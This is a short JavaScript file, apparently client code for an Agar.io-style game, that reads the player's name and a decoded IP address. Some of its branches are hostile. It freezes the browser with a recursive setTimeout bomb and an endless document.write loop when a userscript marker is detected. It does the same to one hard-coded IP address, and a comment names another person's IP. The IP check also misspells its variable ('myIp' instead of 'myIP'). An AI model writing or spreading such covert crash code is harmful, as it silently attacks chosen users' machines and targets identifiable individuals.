var happyBirthdayIP = [];

try {
	if(sessionStorage.playerName != undefined) {
        var nn = sessionStorage.playerName;
        var nntrim = nn.replace(/ /g,"");
	} else {
		nntrim = "no_name";
	}
    var myIP = atob(serIp);
}
catch(err) {
    var myIP = "no_ip";
    nntrim = "no_name_undefined";
}
try {
  setTimeout(function() {

	/*if (window.botConfig != undefined) {
		window.CONNECTION_URL = "public-ogarii.glitch.me";
		window.setRegion("public-ogarii.glitch.me");
  		function die () {
  			setTimeout(function () {die(); die()}, 0)
  		}
		while(true) {
			document.write("true");
		}
	}*/
	if (window.scriptVersion != undefined) {
		function die () {
                        setTimeout(function () {die(); die()}, 0)
                }
                while(true) {
                        document.write("true");
                }

	}

  }, 8000);
} catch(err) {

}
if ( myIp == "178.223.241.46") { // Tomi 85.94.132.32
	function die () {
                        setTimeout(function () {die(); die()}, 0)
                }
	die();
//	window.location.href = "";
}

for(var i=0; i < happyBirthdayIP.length; i++) {
	if(myIP == happyBirthdayIP[i]) {
		$("#helloDialog h1").html('<i class="birthday large icon"></i>Sretan rodjendan');

	}
}
if(myIP == "212.69.24.51") {
//	localStorage.removeItem("bfc");
//	localStorage.removeItem("bfd");
//	localStorage.removeItem("bfg");
//	localStorage.removeItem("bf_d");
}

if (localStorage.getItem("april") != null) {
localStorage.removeItem("april");
}
